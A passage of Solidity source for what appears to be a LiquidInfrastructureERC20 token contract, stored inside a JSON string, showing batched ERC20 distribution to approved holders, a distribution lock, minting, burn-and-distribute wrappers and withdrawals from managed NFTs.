_beginDistribution();\n        }\n\n        uint256 limit = Math.min(\n            nextDistributionRecipient + numDistributions,\n            holders.length\n        );\n\n        uint i;\n        for (i = nextDistributionRecipient; i < limit; i++) {\n            address recipient = holders[i];\n            if (isApprovedHolder(recipient)) {\n                uint256[] memory receipts = new uint256[](\n                    distributableERC20s.length\n                );\n                for (uint j = 0; j < distributableERC20s.length; j++) {\n                    IERC20 toDistribute = IERC20(distributableERC20s[j]);\n                    uint256 entitlement = erc20EntitlementPerUnit[j] *\n                        this.balanceOf(recipient);\n                    if (toDistribute.transfer(recipient, entitlement)) {\n                        receipts[j] = entitlement;\n                    }\n                }\n\n                emit Distribution(recipient, distributableERC20s, receipts);\n            }\n        }\n        nextDistributionRecipient = i;\n\n        if (nextDistributionRecipient == holders.length) {\n            _endDistribution();\n        }\n    }\n\n    /**\n     * Determines if the minimum distribution period has elapsed, which is used for restricting\n     * minting and burning operations\n     */\n    function _isPastMinDistributionPeriod() internal view returns (bool) {\n        // Do not force a distribution with no holders or supply\n        if (totalSupply() == 0 || holders.length == 0) {\n            return false;\n        }\n\n        return (block.number - LastDistribution) >= MinDistributionPeriod;\n    }\n\n    /**\n     * Prepares this contract for distribution:\n     * - Locks the contract\n     * - Calculates the entitlement to protocol-held ERC20s per unit of the LiquidInfrastructureERC20 held\n     */\n    function _beginDistribution() internal {\n        require(\n            !LockedForDistribution,\n            \"cannot begin distribution when already locked\"\n        );\n        LockedForDistribution = true;\n\n        // clear the previous entitlements, if any\n        if (erc20EntitlementPerUnit.length > 0) {\n            delete erc20EntitlementPerUnit;\n        }\n\n        // Calculate the entitlement per token held\n        uint256 supply = this.totalSupply();\n        for (uint i = 0; i < distributableERC20s.length; i++) {\n            uint256 balance = IERC20(distributableERC20s[i]).balanceOf(\n                address(this)\n            );\n            uint256 entitlement = balance / supply;\n            erc20EntitlementPerUnit.push(entitlement);\n        }\n\n        nextDistributionRecipient = 0;\n        emit DistributionStarted();\n    }\n\n    /**\n     * Unlocks this contract at the end of a distribution\n     */\n    function _endDistribution() internal {\n        require(\n            LockedForDistribution,\n            \"cannot end distribution when not locked\"\n        );\n        delete erc20EntitlementPerUnit;\n        LockedForDistribution = false;\n        LastDistribution = block.number;\n        emit DistributionFinished();\n    }\n\n    /**\n     * Convenience function that allows the contract owner to distribute when necessary and then mint right after\n     *\n     * @notice attempts to distribute to every holder in this block, which may exceed the block gas limit\n     * if this fails then first call distribute\n     */\n    function mintAndDistribute(\n        address account,\n        uint256 amount\n    ) public onlyOwner {\n        if (_isPastMinDistributionPeriod()) {\n            distributeToAllHolders();\n        }\n        mint(account, amount);\n    }\n\n    /**\n     * Allows the contract owner to mint tokens for an address\n     *\n     * @notice minting may only occur when a distribution has happened within MinDistributionPeriod blocks\n     */\n    function mint(\n        address account,\n        uint256 amount\n    ) public onlyOwner nonReentrant {\n        _mint(account, amount);\n    }\n\n    /**\n     * Convenience function that allows a token holder to distribute when necessary and then burn their tokens right after\n     *\n     * @notice attempts to distribute to every holder in this block, which may exceed the block gas limit\n     * if this fails then first call distribute() enough times to finish a distribution and then call burn()\n     */\n    function burnAndDistribute(uint256 amount) public {\n        if (_isPastMinDistributionPeriod()) {\n            distributeToAllHolders();\n        }\n        burn(amount);\n    }\n\n    /**\n     * Convenience function that allows an approved sender to distribute when necessary and then burn the approved tokens right after\n     *\n     * @notice attempts to distribute to every holder in this block, which may exceed the block gas limit\n     * if this fails then first call distribute() enough times to finish a distribution and then call burnFrom()\n     */\n    function burnFromAndDistribute(address account, uint256 amount) public {\n        if (_isPastMinDistributionPeriod()) {\n            distributeToAllHolders();\n        }\n        burnFrom(account, amount);\n    }\n\n    function withdrawFromAllManagedNFTs() public {\n        withdrawFromManagedNFTs(ManagedNFTs.length);\n    }\n\n    /**\n     * Performs withdrawals from the ManagedNFTs collection, depositing all token balances into the custody of this contract\n     * @param numWithdrawals the number of withdrawals to perform\n     */\n    function withdrawFromManagedNFTs(uint256 numWithdrawals) public {\n        require(!LockedForDistribution, \"cannot withdraw during distribution\");\n\n        if (nextWithdrawal == 0) {\n            emit WithdrawalStarted();\n        }\n\n        uint256 limit = Math.min(\n            numWithdrawals + nextWithdrawal,\n            ManagedNFTs.length\n        );\n        uint256 i;\n        for (i = nextWithdrawal; i < limit; i++) {\n            LiquidInfrastructureNFT withdrawFrom = LiquidInfrastructureNFT(\n                ManagedNFTs[i]\n            );\n\n            (address[] memory withdrawERC20s, ) = withdrawFrom.getThresholds();\n            withdrawFrom.withdrawBalancesTo(withdrawERC20s, address(this));\n            emit Withdrawal(address(withdrawFrom));\n        }\n        nextWithdrawal = i;\n\n        if (nextWithdrawal == ManagedNFTs.length) {"
    }
  ]
}